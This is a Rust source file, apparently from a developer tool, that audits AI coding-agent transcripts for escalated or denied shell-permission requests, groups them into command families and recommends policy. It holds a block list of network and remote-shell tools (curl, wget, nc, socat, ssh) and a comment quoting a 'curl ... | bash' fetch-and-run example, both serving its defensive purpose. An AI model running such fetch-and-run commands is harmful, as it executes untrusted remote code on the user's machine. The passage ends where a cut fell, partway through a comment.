//! `zirv ctx permissions audit` (issue #132): a transcript-backed audit of
//! recent escalated/denied command-permission requests, grouped by a
//! normalized command family, with a reusability verdict ("will the saved
//! approval match the next equivalent command?") and a recommendation.
//!
//! Two extractors, agent-neutral output:
//! - **codex**: `response_item` / `custom_tool_call` records named `exec`
//!   whose payload carries `sandbox_permissions: "require_escalated"` (the
//!   shape documented in issue #132's own reproduction section, over
//!   `~/.codex/sessions/**/*.jsonl`).
//! - **claude**: a headless (`--permission-mode dontAsk`) launch's
//!   `PreToolUse` denial, grounded in this machine's own real transcripts
//!   under `~/.claude/projects/<slug>/*.jsonl` -- an assistant `tool_use`
//!   entry correlated by `id`/`tool_use_id` with a later user `tool_result`
//!   entry carrying `"is_error":true` and text starting "Permission to use
//!   <Tool> has been denied because Claude Code is running in don't ask
//!   mode." (verified by inspecting real session files, not guessed).
//!
//! Both extractors reuse `safety.rs`'s own wrapper-normalization helpers
//! (`pipeline_stages`, `unwrap_env_prefix`, `unwrap_shell_wrapper`,
//! `strip_program_dir`, `sql_program_name`) so a `/bin/zsh -lc '...'` or
//! `env -u FOO zirv ...` wrapper collapses to the same family as the bare
//! command underneath it -- the exact normalization gap issue #132 names.

use std::collections::HashMap;
use std::io::Write;
use std::path::{Path, PathBuf};

use clap::ValueEnum;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use super::CtxResult;
use super::log::{self, SafetyDecisionRecord};
use super::safety::{
    collapse_whitespace, command_fails_escape_screen, command_pattern_from_bash_rule, glob_match,
    pipeline_stages, sha256_hex, sql_program_name, strip_program_dir, unwrap_env_prefix,
    unwrap_shell_wrapper,
};

/// Which agent's transcripts to audit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, ValueEnum)]
pub enum AuditAgent {
    Codex,
    Claude,
}

impl AuditAgent {
    pub fn label(self) -> &'static str {
        match self {
            AuditAgent::Codex => "codex",
            AuditAgent::Claude => "claude",
        }
    }
}

/// One escalated/denied permission request extracted from one transcript.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct PermissionRequest {
    pub session: String,
    /// The raw command/tool invocation as it appeared in the transcript.
    pub raw: String,
    /// The normalized command family this request is grouped under.
    pub family: String,
    /// Why the harness required a human/policy decision.
    pub cause: String,
    /// What happened to the request: `"escalated"` (codex; the transcript
    /// does not itself record the operator's answer) or `"denied"` (claude,
    /// a headless `dontAsk` refusal).
    pub result: String,
    /// Whether a saved approval for this exact family would plausibly match
    /// the NEXT equivalent invocation, or whether it would collapse to a
    /// one-off (a long literal payload) or a downstream-only capability (a
    /// pipe into `jq`/`grep`/`awk`/`sed` whose own argument is what varies).
    pub reusable: bool,
    /// Issue #147: the claude permission mode active at request time
    /// (`"default"`/`"plan"`/`"acceptEdits"`/`"dontAsk"`/`"auto"`/
    /// `"bypassPermissions"`), read from the transcript's own
    /// `type: "permission-mode"` event line (or a `permissionMode` field
    /// carried directly on the surrounding entry). Empty when the
    /// transcript predates that field, or for a codex request (no analogue).
    pub permission_mode: String,
    /// Issue #147: whether this request happened inside a claude sidechain
    /// (`isSidechain: true` -- a sub-agent/Task-tool-spawned transcript
    /// branch) rather than the main conversation. `false` for codex (no
    /// sidechain concept) and for a claude transcript entry that omits the
    /// field.
    pub is_sidechain: bool,
}

/// One command family's aggregated requests, ready to render or recommend
/// a policy change from.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct FamilyGroup {
    pub family: String,
    pub count: usize,
    /// Reusable only when every member request in this family is reusable.
    pub reusable: bool,
    pub sample: String,
    pub cause: String,
    pub recommendation: String,
    /// Issue #132's `compile` verb's cached read of [`is_protected_family`]
    /// over this group's members (`true` if ANY member's raw command
    /// classifies as protected -- see `group_requests`'s own comment). A
    /// cache, not the enforcement itself: `run_compile` re-runs
    /// `is_protected_family(&family, &sample)` independently at write time
    /// rather than trusting this field, so a doctored or stale report (e.g.
    /// `--json` output hand-edited and fed back in some future flow) can
    /// never smuggle a protected family into a standing allow just by
    /// setting this to `false`.
    pub protected: bool,
}

/// The whole audit, agent-neutral.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct AuditReport {
    pub agent: &'static str,
    pub sessions_scanned: usize,
    pub total_requests: usize,
    pub groups: Vec<FamilyGroup>,
    /// Issue #147: the ungrouped requests `groups` above was folded from --
    /// `run_compile`'s `--escape` eligibility pass needs each request's own
    /// `cause`/`result` (an interactive sandbox-escape ask vs. an ordinary
    /// denial), which a `FamilyGroup` does not carry.
    pub requests: Vec<PermissionRequest>,
}

/// Above this many total requests, `optimize`'s friction pass surfaces the
/// audit as a finding (issue #132's "surface the same summary in
/// setup/optimization output when approval noise exceeds a documented
/// threshold"). Chosen well below the 33-in-one-session count the issue's
/// own production evidence reports, so the finding fires long before a
/// session reaches that volume.
pub const NOISE_FINDING_THRESHOLD: usize = 5;

// ---------------------------------------------------------------------
// Family normalization + reusability, shared by both extractors
// ---------------------------------------------------------------------

/// Depth (program + how many leading non-flag tokens) that names a stable
/// family for a multi-word CLI. Everything else collapses to just its
/// program name -- `curl https://a` and `curl https://b` are one family.
fn family_depth(program: &str) -> usize {
    match program {
        "zirv" => 3,
        // Issue #141: `uv` joins its sibling subcommand-based package
        // managers/CLIs so `uv run <script>` normalizes to the two-token
        // family `"uv run"` -- distinct from `uv sync`/`uv add`/`uv pip`,
        // which are not arbitrary-code executors and stay compileable.
        "git" | "gh" | "cargo" | "npm" | "docker" | "kubectl" | "npx" | "pnpm" | "yarn" | "uv" => 2,
        _ => 1,
    }
}

/// Peels `env`/shell-wrapper layers off `segment` (bounded to 4 layers,
/// matching `safety.rs`'s own structural-candidate depth), returning the
/// innermost command text -- `env -u FOO zirv ...` or `/bin/zsh -lc '...'`
/// collapse to the wrapped command underneath. Shared by [`family_of`] (the
/// leading command) and [`is_reusable`] (2026-08-25 review: a decorated
/// pipe target like `... | env NO_COLOR=1 jq .` must still be recognised as
/// `jq`, not missed because the filter check only looked at the bare last
/// stage).
fn unwrap_wrappers(segment: &str) -> String {
    let mut current = segment.to_string();
    for _ in 0..4 {
        if let Some(inner) = unwrap_env_prefix(&current) {
            current = inner;
            continue;
        }
        if let Some(inner) = unwrap_shell_wrapper(&current) {
            current = inner;
            continue;
        }
        break;
    }
    current
}

/// Normalizes a raw command/tool invocation to a stable family key: unwraps
/// `env`/shell wrappers, drops to the first pipeline stage (the real
/// command; a trailing `| jq ...` is a downstream formatting stage, not a
/// different family), then keeps the program name plus as many leading
/// non-flag tokens as [`family_depth`] says are part of this program's own
/// stable invocation shape (`gh issue`, `zirv setup apply`, `cargo`).
pub(crate) fn family_of(raw: &str) -> String {
    let first_stage = pipeline_stages(raw).into_iter().next().unwrap_or_default();
    let current = unwrap_wrappers(&first_stage);
    let collapsed = collapse_whitespace(&strip_program_dir(&current));
    let tokens: Vec<&str> = collapsed.split(' ').filter(|t| !t.is_empty()).collect();
    let Some(first) = tokens.first() else {
        return "(empty)".to_string();
    };
    let program = sql_program_name(first);
    let depth = family_depth(&program);
    let mut parts = vec![program];
    for token in tokens.iter().skip(1).take(depth.saturating_sub(1)) {
        if token.starts_with('-') {
            break;
        }
        parts.push(token.to_ascii_lowercase());
    }
    parts.join(" ")
}

/// The longest single- or double-quoted span in `raw`, by character count
/// (quotes excluded). A long quoted span is the signature of a one-off
/// literal payload -- an issue/PR body, a commit message -- that will never
/// recur verbatim, so a saved approval keyed on the exact command text
/// cannot match the next equivalent invocation.
fn longest_quoted_span(raw: &str) -> usize {
    let mut longest = 0usize;
    let mut chars = raw.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '"' && c != '\'' {
            continue;
        }
        let quote = c;
        let mut len = 0usize;
        let mut escaped = false;
        for inner in chars.by_ref() {
            if escaped {
                escaped = false;
                len += 1;
                continue;
            }
            if inner == '\\' {
                escaped = true;
                continue;
            }
            if inner == quote {
                break;
            }
            len += 1;
        }
        longest = longest.max(len);
    }
    longest
}

/// Above this many characters, a quoted span reads as a one-off literal
/// payload rather than a short flag value (a branch name, a query string).
const LONG_LITERAL_THRESHOLD: usize = 80;

/// Whether a saved approval for `raw` would plausibly match the next
/// equivalent invocation: false when the command embeds a long literal
/// payload, or pipes into a text filter whose own argument is the varying
/// part of the command (issue #132: "piped read-only API queries produced
/// approvals for downstream `jq` expressions instead of one reusable
/// read-only API capability").
pub(crate) fn is_reusable(raw: &str) -> bool {
    if raw.trim().is_empty() {
        return true;
    }
    if longest_quoted_span(raw) > LONG_LITERAL_THRESHOLD {
        return false;
    }
    let stages = pipeline_stages(raw);
    if stages.len() > 1
        && let Some(last) = stages.last()
    {
        // 2026-08-25 review: unwrap the last stage's own env/shell wrapper
        // before matching the filter program name, so `| env NO_COLOR=1 jq
        // .` is still recognised as a `jq` pipe target and not missed
        // because the wrapper sat in front of it.
        let unwrapped = unwrap_wrappers(last);
        let collapsed = collapse_whitespace(&strip_program_dir(&unwrapped));
        let first = collapsed.split(' ').next().unwrap_or("");
        if matches!(
            sql_program_name(first).as_str(),
            "jq" | "grep" | "awk" | "sed"
        ) {
            return false;
        }
    }
    true
}

/// Command families issue #132 requires stay prompting no matter how
/// reusable the saved approval would otherwise be: "keep global writes,
/// destructive operations, secrets, and publish/release actions prompting
/// unless explicitly enabled by the operator." `git push --force origin
/// main` is a perfectly REUSABLE family by [`is_reusable`]'s own definition
/// (no long literal, no filter pipe) -- that is exactly why reusability
/// alone cannot gate the recommendation; a protected family must never be
/// recommended a standing allow regardless.
///
/// `sample` (not just `family`) is what a caller must classify against:
/// `family_of` strips flags, so `git push --force origin main` and `git
/// push origin feature` both normalize to the family `"git push"` --
/// distinguishing them needs the actual command text, which is why this
/// function takes both.
///
/// Interpreter/shell/remote-exec/network-fetch program names (review round
/// 1, 2026-08-26): a family compiled from one of these would authorize
/// whatever a FUTURE invocation is told to run -- `python -c "<code>"` today,
/// arbitrary other code tomorrow, all under the identical `"python *"`
/// pattern -- so these are protected UNCONDITIONALLY, regardless of
/// arguments. `family_of`'s own depth-1 fallback (`family_depth`) already
/// collapses every one of these to the bare program name, so `family` alone
/// (not `sample`) is the check: it is the already-unwrapped, already-
/// normalized name, immune to a wrapper (`env`, a shell `-c`) that
/// `family_of` peeled off before this function ever saw the command. This
/// also protects `zirv ctx permissions audit`'s own recommendation, not just
/// `compile`'s eligibility -- both call this same function.
const INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "cmd",
    "pwsh",
    "powershell",
    "python",
    "python3",
    "python2",
    "node",
    "deno",
    "bun",
    "perl",
    "ruby",
    "php",
    "lua",
    "ssh",
    "scp",
    "curl",
    "wget",
    "nc",
    "ncat",
    "socat",
];

/// Flags that hand an interpreter/shell a literal command string to execute
/// rather than a script file path. A second, cruder net over the raw sample
/// tokens (not just `family`): a nested/wrapped invocation `family_of` did
/// not fully unwrap (e.g. `docker exec ... sh -c 'curl ... | bash'`, whose
/// own family is `"docker exec"`, not `"sh"`) still carries both an
/// interpreter program name and one of these flags somewhere in its token
/// stream, and that combination is protected too.
const INLINE_CODE_FLAGS: &[&str] = &["-c", "-e", "-command", "--eval"];

/// Issue #141: package/script launchers whose FIRST positional argument
/// names arbitrary code to run -- `npx <pkg>`, `bunx <pkg>`, `uvx <pkg>` --
/// so the whole family is protected regardless of which package follows,
/// the same "protected by first token alone" mechanism
/// `INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS` uses right above (a separate
/// list purely so each one documents its own distinct risk category rather
/// than being folded into "interpreter/shell"). `npx` already normalizes to
/// a two-token family (`family_depth`); `bunx`/`uvx` are not in that map, so
/// their family stays the single-token program name -- either shape checks
/// out via `family_program` (the family's own first token) below.
const ARBITRARY_PACKAGE_EXEC_PROGRAMS: &[&str] = &["npx", "bunx", "uvx"];

/// Issue #141: `gh api`'s method/body flags -- a bare `gh api <path>` sends
/// a GET and is read-only, but `-X`/`--method <verb>` naming anything other
/// than GET, or a request-body flag (`-f`/`--field`/`--input`) implying one
/// is about to be sent, both mean the call mutates whatever the endpoint
/// controls. `tokens` is already lowercased, so `verb` comparisons below are
/// case-insensitive for free.
fn gh_api_call_is_mutating(tokens: &[String]) -> bool {
    let method_is_non_get = tokens.iter().enumerate().any(|(i, t)| {
        if let Some(value) = t.strip_prefix("--method=") {
            return value != "get";
        }
        (t == "-x" || t == "--method") && tokens.get(i + 1).is_some_and(|value| value != "get")
    });
    let has_body_flag = tokens
        .iter()
        .any(|t| matches!(t.as_str(), "-f" | "--field" | "--input"));
    method_is_non_get || has_body_flag
}

/// Pure: token/substring matching only, no fs/clock/env, the same
/// discipline `safety.rs`'s own classifiers hold to. This is a
/// recommendation heuristic for `zirv ctx permissions audit`'s report, not
/// a hard safety gate -- `safety.rs`'s `SHIPPED_POSTURE_DENY`/`_ASK` remain
/// the actual enforcement boundary a launch is projected against.
pub(crate) fn is_protected_family(family: &str, sample: &str) -> bool {
    let tokens: Vec<String> = sample
        .split(|c: char| c.is_whitespace() || matches!(c, '\'' | '"' | '`'))
        .filter(|t| !t.is_empty())
        .map(str::to_ascii_lowercase)
        .collect();
    // Review round 1 (2026-08-26): matches a bare flag OR that same flag
    // carrying an `=`-joined value (`--force-with-lease=origin/main`) --
    // `has("--force-with-lease")` used to check exact token equality only,
    // so the `=`-joined spelling escaped every arm below that checks for it.
    // Fixed once, here, rather than per call site, so every existing and
    // future `has(...)` check gets the fix automatically.
    let has = |word: &str| {
        tokens
            .iter()
            .any(|t| t == word || t.starts_with(&format!("{word}=")))
    };
    let has_bundled_short_force = tokens.iter().any(|t| {
        t.starts_with('-')
            && !t.starts_with("--")
            && t.len() > 1
            && t[1..].chars().all(|c| c.is_ascii_alphabetic())
            && t.contains('f')
    });
    let lower_sample = sample.to_ascii_lowercase();
    let writes_into_a_global_install_path = matches!(
        family,
        "cp" | "copy" | "xcopy" | "copy-item" | "mv" | "move" | "install"
    ) && (lower_sample.contains("program files")
        || lower_sample.contains("/usr/local/")
        || lower_sample.contains("/usr/bin/")
        || lower_sample.contains("/usr/sbin/")
        || lower_sample.contains("c:\\windows\\"));

    let family_program = family.split(' ').next().unwrap_or(family);
    let is_interpreter_shell_or_remote_exec_family =
        INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS.contains(&family_program);
    let has_interpreter_and_inline_code_flag = tokens
        .iter()
        .any(|t| INTERPRETER_SHELL_REMOTE_EXEC_PROGRAMS.contains(&t.as_str()))
        && tokens.iter().any(|t| {
            INLINE_CODE_FLAGS.contains(&t.as_str())
                || t.starts_with("--eval=")
                || t.starts_with("-command=")
        });
    // Issue #141: `npx`/`bunx`/`uvx` run whatever package their first
    // positional argument names -- protected regardless of which package
    // that is, matched on the family's own first token exactly like the
    // interpreter/shell class above.
    let is_arbitrary_package_exec_family =
        ARBITRARY_PACKAGE_EXEC_PROGRAMS.contains(&family_program);

    let family_protected = match family {
        // Destructive git: recoverable in principle (a reflog, a rebuild)
        // but exactly the family issue #132 names as one that must keep
        // prompting rather than being silently granted a standing allow.
        "git push" => {
            has("--force") || has("--force-with-lease") || has("-f") || has("--delete") || has("-d")
        }
        "git reset" => has("--hard"),
        "git clean" => has("--force") || has_bundled_short_force,
        "git branch" => has("-d") || has("--delete"),
        // History rewrites: always protected, no flag needed.
        "git rebase" | "git filter-branch" => true,
        // A tag alone is harmless; a tag pushed to a remote is a release.
        "git tag" => has("push"),
        // Publish/release: irreversible by nature.
        "cargo publish" | "npm publish" | "gh release" | "cargo install" |
        // Issue #141: `cargo run` compiles and executes arbitrary crate
        // code -- the identical risk class as `cargo install`, just without
        // the "stays on disk afterward" property.
        "cargo run" => true,
        // Credential/secret surfaces.
        "gh auth" | "git credential" | "ssh-keygen" | "security" => true,
        // Global binary/config installs.
        "choco" | "winget" => true,
        "npm install" | "npm" => has("-g") || has("--global"),
        // Issue #141: subcommand-level arbitrary-code executors. Each of
        // these runs a container image, a cluster workload, or a
        // package.json/Makefile-equivalent script chosen by the invocation's
        // OWN arguments -- protected unconditionally, the same "regardless
        // of arguments" reasoning `cargo install`/`cargo run` above already
        // get, not gated on any particular flag. Narrow read-only siblings
        // in the same CLI (`docker ps`, `kubectl get`, `npm install` without
        // `-g`) are untouched -- each stays its own, unprotected family key.
        "docker run" | "docker exec" => true,
        "kubectl exec" | "kubectl run" => true,
        "npm run" | "npm exec" => true,
        "pnpm run" | "pnpm exec" | "pnpm dlx" => true,
        "yarn run" | "yarn dlx" => true,
        "uv run" => true,
        // Issue #141: `gh api` is protected only when it actually mutates --
        // see `gh_api_call_is_mutating`'s own doc comment. A bare read
        // (`gh api repos/x/y`, an implicit GET) stays compileable.
        "gh api" => gh_api_call_is_mutating(&tokens),
        _ => false,
    };

    family_protected
        || writes_into_a_global_install_path
        || has("token")
        || has("keychain")
        || has("keyring")
        || is_interpreter_shell_or_remote_exec_family
        || has_interpreter_and_inline_code_flag
        || is_arbitrary_package_exec_family
}

// ---------------------------------------------------------------------
// Issue #147, design decision 7: native claude permission conflicts
// ---------------------------------------------------------------------

#[derive(Debug, Clone, Default, Deserialize)]
struct NativeClaudeSettings {
    #[serde(default)]
    permissions: NativeClaudePermissions,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct NativeClaudePermissions {
    #[serde(default)]
    deny: Vec<String>,
    #[serde(default)]
    ask: Vec<String>,
}

/// Best-effort read of the operator's own native claude permission rules --
/// NEVER written to, only read, so a recommended/compiled zirv family is
/// never silently presented as "fixed" while the operator's own
/// `~/.claude/settings.json` (and, trivially, a project `.claude/
/// settings.json` under `repo`, when given) still blocks or prompts on it.
/// A read/parse failure for either file simply contributes nothing -- the
/// conflict check then finds no conflict, degrading to pre-#147 behavior
/// rather than failing the audit/compile outright. Returns `(pattern,
/// "deny"|"ask")` pairs with the `Bash(...)` wrapper already stripped
/// (`safety::command_pattern_from_bash_rule`), the identical shape zirv's
/// own `[safety]` rules use.
fn read_native_claude_rules(home: &Path, repo: Option<&Path>) -> Vec<(String, &'static str)> {
    let mut out = Vec::new();
    let candidates = [
        Some(home.join(".claude").join("settings.json")),
        repo.map(|r| r.join(".claude").join("settings.json")),
    ];
    for path in candidates.into_iter().flatten() {
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Ok(settings) = serde_json::from_str::<NativeClaudeSettings>(&text) else {
            continue;
        };
        out.extend(
            settings
                .permissions
                .deny
                .iter()
                .filter_map(|r| command_pattern_from_bash_rule(r))
                .map(|p| (p, "deny")),
        );
        out.extend(
            settings
                .permissions
                .ask
                .iter()
                .filter_map(|r| command_pattern_from_bash_rule(r))
                .map(|p| (p, "ask")),
        );
    }
    out
}

/// Whether `sample` -- a family's representative command -- would still be
/// blocked (`deny`) or re-prompted (`ask`) by one of the operator's own
/// native claude permission rules, matched with the identical glob matcher
/// (`safety::glob_match`) claude's own `Bash(<pattern>)` rules use. Returns
/// a human-readable name for the first conflicting rule found, for a
/// warning message -- never used to suppress a recommendation/write, only
/// to correct how it is presented (design decision 7's own wording).
fn native_conflict(native_rules: &[(String, &'static str)], sample: &str) -> Option<String> {
    native_rules
        .iter()
        .find(|(pattern, _)| glob_match(pattern, sample))
        .map(|(pattern, kind)| format!("Bash({pattern}) [{kind}]"))
}

fn recommendation_for(family: &str, protected: bool, reusable: bool) -> String {
    if protected {
        return format!(
            "'{family}' is a protected family: stays prompting unless the operator explicitly \
             enables it (destructive git, a global binary/config install, a credential/secret \
             command, or a publish/release action -- issue #132). Do not grant a standing allow, \
             regardless of reusability."
        );
    }
    if reusable {
        format!(
            "Grant '{family}' a standing allow in the operator's [safety]/[policy] \
             layer -- every observed invocation normalizes to this one family."
        )
    } else {
        format!(
            "Approve the '{family}' CAPABILITY once, not the literal command: the \
             saved approval must normalize away the varying payload (a long \
             quoted body, or a downstream filter expression) or it will keep \
             re-prompting on the next equivalent invocation."
        )
    }
}

// ---------------------------------------------------------------------
// Codex extractor
// ---------------------------------------------------------------------

/// Whether `payload` (a `custom_tool_call` record) requested escalated
/// sandbox permissions, either directly or nested inside a JSON-encoded
/// `input` string.
fn escalation_requested(payload: &Value) -> bool {
    if payload.get("sandbox_permissions").and_then(Value::as_str) == Some("require_escalated") {
        return true;
    }
    if let Some(input) = payload.get("input").and_then(Value::as_str)
        && let Ok(inner) = serde_json::from_str::<Value>(input)
        && inner.get("sandbox_permissions").and_then(Value::as_str) == Some("require_escalated")
    {
        return true;
    }
    false
}

fn command_string(node: &Value) -> Option<String> {
    if let Some(s) = node.get("command").and_then(Value::as_str) {
        return Some(s.to_string());
    }
    if let Some(arr) = node.get("command").and_then(Value::as_array) {
        let parts: Vec<&str> = arr.iter().filter_map(Value::as_str).collect();
        if !parts.is_empty() {
            return Some(parts.join(" "));
        }
    }
    None
}

fn codex_command_of(payload: &Value) -> Option<String> {
    if let Some(command) = command_string(payload) {
        return Some(command);
    }
    let input = payload.get("input").and_then(Value::as_str)?;
    let inner: Value = serde_json::from_str(input).ok()?;
    command_string(&inner)
}

/// Extracts every `require_escalated` exec request from one codex rollout
/// JSONL transcript (see this module's own doc comment for the shape).
pub fn extract_codex_requests(text: &str, session: &str) -> Vec<PermissionRequest> {
    let mut out = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        if v.get("type").and_then(Value::as_str) != Some("response_item") {
            continue;
        }
        let Some(payload) = v.get("payload") else {
            continue;
        };
        if payload.get("type").and_then(Value::as_str) != Some("custom_tool_call") {
            continue;
        }
        if payload.get("name").and_then(Value::as_str) != Some("exec") {
            continue;
        }
        if !escalation_requested(payload) {
            continue;
        }
        let Some(command) = codex_command_of(payload) else {
            continue;
        };
        let family = family_of(&command);
        let reusable = is_reusable(&command);
        out.push(PermissionRequest {
            session: session.to_string(),
            raw: command,
            family,
            cause: "sandbox_permissions: require_escalated".to_string(),
            result: "escalated".to_string(),
            reusable,
            permission_mode: String::new(),
            is_sidechain: false,
        });
    }
    out
}

// ---------------------------------------------------------------------
// Claude extractor
// ---------------------------------------------------------------------

#[derive(Default, Clone)]
struct ClaudeToolUse {
    name: String,
    command: Option<String>,
    /// Whether `input.dangerouslyDisableSandbox` was set -- the exact
    /// signal `safety::run_check_hook_mode_with_env` keys its own escalation
    /// branch on (issue #147).
    dangerously_disable_sandbox: bool,
    /// The claude permission mode in force when this tool_use was recorded
    /// (issue #147) -- see `PermissionRequest::permission_mode`'s own doc
    /// comment for where it comes from.
    permission_mode: String,
    is_sidechain: bool,
    /// Unix seconds, parsed from the entry's own `timestamp` field
    /// (`window::parse_iso8601_utc`). `None` when absent/unparseable, in
    /// which case log correlation matches on session+hash alone.
    timestamp: Option<u64>,
}

fn tool_result_text(entry: &Value) -> String {
    match entry.get("content") {
        Some(Value::String(s)) => s.clone(),
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(|t| t.get("text").and_then(Value::as_str))
            .collect::<Vec<_>>()
            .join(" "),
        _ => String::new(),
    }
}

/// A safety-decision log correlation must land within this many seconds of
/// the transcript's own tool_use timestamp to count as the SAME invocation
/// (issue #147) -- generous enough to absorb clock/serialization skew
/// between the hook process and the transcript writer, tight enough that a
/// much later re-run of the identical command text is never mismatched to
/// an earlier decision.
const CORRELATION_WINDOW_SECS: u64 = 300;

/// Issue #147, design decision 5: correlates one transcript command against
/// zirv's own safety-decision log (`log::read_safety_decisions`) -- the
/// actual hook verdict for THIS invocation, not a guess from the
/// transcript's own denial text alone. Join key: same session id and the
/// identical `command_sha256` the hook itself computed
/// (`safety::audit_hook_decision`: `sha256_hex(command.trim())`); when more
/// than one log entry matches (the same command run more than once in the
/// session), the closest by timestamp wins, and only within
/// `CORRELATION_WINDOW_SECS` -- a match outside the window is treated as no
/// match at all rather than risking a wrong-invocation correlation.
fn correlate_safety_decision<'a>(
    records: &'a [SafetyDecisionRecord],
    session: &str,
    command: &str,
    at: Option<u64>,
) -> Option<&'a SafetyDecisionRecord> {
    let hash = sha256_hex(command.trim().as_bytes());
    let mut candidates: Vec<&SafetyDecisionRecord> = records
        .iter()
        .filter(|r| r.session == session && r.command_sha256 == hash)
        .collect();
    let Some(at) = at else {
        return candidates.pop();
    };
    candidates.sort_by_key(|r| r.ts.abs_diff(at));
    candidates
        .into_iter()
        .find(|r| r.ts.abs_diff(at) <= CORRELATION_WINDOW_SECS)
}

/// Extracts every claude permission request worth an operator's attention
/// from one transcript JSONL file (see this module's own doc comment for
/// the transcript shapes, grounded in real session files on this machine):
/// a headless `dontAsk` denial (as before this issue), now classified via
/// `log_records` rather than a single hardcoded cause string, PLUS every
/// interactive `--dangerously-disable-sandbox` retry the safety-decision
/// log shows was answered with `ask` (issue #147, design decision 5) --
/// invisible to the pre-#147 extractor entirely, since a subsequently
/// ACCEPTED ask never produces an errored tool_result for the old code path
/// to notice. `log_records` is `log::read_safety_decisions`'s own output for
/// this machine's state dir, passed in (rather than read here) so this
/// function stays a pure fold over its two inputs -- `audit_report` reads
/// the log exactly once per call, not once per transcript file.
pub fn extract_claude_requests(
    text: &str,
    session: &str,
    log_records: &[SafetyDecisionRecord],
) -> Vec<PermissionRequest> {
    let mut uses: HashMap<String, ClaudeToolUse> = HashMap::new();
    // tool_use_id -> whether its own tool_result was an error, once seen.
    let mut results: HashMap<String, bool> = HashMap::new();
    let mut out = Vec::new();
    let mut current_permission_mode = String::new();

    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        // A dedicated `{"type":"permission-mode","permissionMode":"..."}`
        // event line (verified against a real transcript,
        // tests/fixtures/claude-real-session.jsonl) is claude's own record
        // of a mode change -- tracked as running state so every later
        // tool_use is stamped with the mode actually in force at that
        // point, not a fixed value guessed once for the whole file.
        if v.get("type").and_then(Value::as_str) == Some("permission-mode") {
            if let Some(mode) = v.get("permissionMode").and_then(Value::as_str) {
                current_permission_mode = mode.to_string();
            }
            continue;
        }
        // Some entries also carry `permissionMode` directly (a `user` line
        // in the real fixture does); as good a signal as the dedicated
        // event line, so it updates the same running value.
        if let Some(mode) = v.get("permissionMode").and_then(Value::as_str) {
            current_permission_mode = mode.to_string();
        }
        let is_sidechain = v
            .get("isSidechain")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        let timestamp = v
            .get("timestamp")
            .and_then(Value::as_str)
            .and_then(super::window::parse_iso8601_utc);

        let Some(content) = v.pointer("/message/content").and_then(Value::as_array) else {
            continue;
        };
        for entry in content {
            match entry.get("type").and_then(Value::as_str) {
                Some("tool_use") => {
                    let Some(id) = entry.get("id").and_then(Value::as_str) else {
                        continue;
                    };
                    let name = entry
                        .get("name")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string();
                    let command = entry
                        .pointer("/input/command")
                        .and_then(Value::as_str)
                        .map(str::to_string)
                        .or_else(|| {
                            entry
                                .pointer("/input/file_path")
                                .and_then(Value::as_str)
                                .map(str::to_string)
                        });
                    let dangerously_disable_sandbox = entry
                        .pointer("/input/dangerouslyDisableSandbox")
                        .and_then(Value::as_bool)
                        .unwrap_or(false);
                    uses.insert(
                        id.to_string(),
                        ClaudeToolUse {
                            name,
                            command,
                            dangerously_disable_sandbox,
                            permission_mode: current_permission_mode.clone(),
                            is_sidechain,
                            timestamp,
                        },
                    );
                }
                Some("tool_result") => {
                    let Some(tool_use_id) = entry.get("tool_use_id").and_then(Value::as_str) else {
                        continue;
                    };
                    let is_error = entry.get("is_error").and_then(Value::as_bool) == Some(true);
                    results.insert(tool_use_id.to_string(), is_error);
                    if !is_error {
                        continue;
                    }
                    let text_val = tool_result_text(entry);
                    if !text_val.contains("Permission to use") {
                        continue;
                    }
                    let Some(used) = uses.get(tool_use_id) else {
                        continue;
                    };
                    let raw = used.command.clone().unwrap_or_else(|| used.name.clone());
                    // The safety hook is registered for Bash/PowerShell
                    // only (`claude::launch_settings_value`'s own
                    // `"matcher": "Bash|PowerShell"`) -- any other tool's
                    // denial can never have zirv's hook as its cause.
                    let is_bash = used.name.eq_ignore_ascii_case("Bash")
                        || used.name.eq_ignore_ascii_case("PowerShell");
                    let family = if is_bash {
                        family_of(&raw)
                    } else {
                        used.name.clone()
                    };
                    let cause = if !is_bash {
                        "native denial (tool outside zirv's safety-hook scope: Bash/PowerShell \
                         only)"
                            .to_string()
                    } else {
                        match correlate_safety_decision(log_records, session, &raw, used.timestamp)
                        {
                            Some(record) if record.verdict == "deny" => {
                                match record.matched_pattern.as_deref() {
                                    Some("<sandbox: unsandboxed retry>") => {
                                        "headless dontAsk denial (sandbox-escape retry not \
                                         escape_allow-cleared)"
                                            .to_string()
                                    }
                                    Some(pattern) => {
                                        format!(
                                            "headless dontAsk denial (zirv safety hook: {pattern})"
                                        )
                                    }
                                    None => {
                                        "headless dontAsk denial (zirv safety hook)".to_string()
                                    }
                                }
                            }
                            // A correlation exists but was not itself a
                            // `deny` -- the log and the transcript disagree
                            // (a config change mid-session, or a coarser
                            // time-window collision); report the mismatch
                            // rather than asserting a cause the evidence
                            // does not support.
                            Some(_) => "headless dontAsk denial (safety-decision log \
                                         correlated but its own verdict was not `deny` -- see \
                                         the raw log)"
                                .to_string(),
                            // No log evidence at all (older run, pruned
                            // log, missing state dir): the pre-#147
                            // fallback wording, unchanged.
                            None => "permission-mode dontAsk denial".to_string(),
                        }
                    };
                    out.push(PermissionRequest {
                        session: session.to_string(),
                        raw,
                        family,
                        cause,
                        result: "denied".to_string(),
                        reusable: !is_bash
                            || is_reusable(&used.command.clone().unwrap_or_default()),
                        permission_mode: used.permission_mode.clone(),
                        is_sidechain: used.is_sidechain,
                    });
                }
                _ => {}
            }
        }
    }

    // Second pass (issue #147, design decision 5): every Bash/PowerShell
